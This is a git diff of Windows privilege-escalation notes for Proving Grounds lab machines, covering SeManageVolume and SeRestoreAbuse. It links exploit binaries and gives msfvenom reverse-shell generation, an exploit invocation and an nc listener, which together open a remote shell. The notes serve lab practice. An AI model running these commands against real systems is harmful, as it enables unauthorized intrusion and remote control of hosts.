@@ -15,7 +15,7 @@ Potatos from Windows PrivEsc
 ## SeManageVolume
 
 {% hint style="info" %}
-Vault \[PG AD]
+Access \[PG AD]
 {% endhint %}
 
 {% embed url="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public" %}
@@ -24,6 +24,10 @@ Vault \[PG AD]
 
 ## SeRestoreAbuse
 
+{% hint style="info" %}
+Vault \[PG AD]
+{% endhint %}
+
 {% embed url="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" %}
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80`
@@ -31,5 +35,3 @@ Vault \[PG AD]
 `.\SeRestoreAbuse.exe C:\Temp\reverse.exe [Absolute path]`
 
 `nc -lvnp 80`
-
-dfff
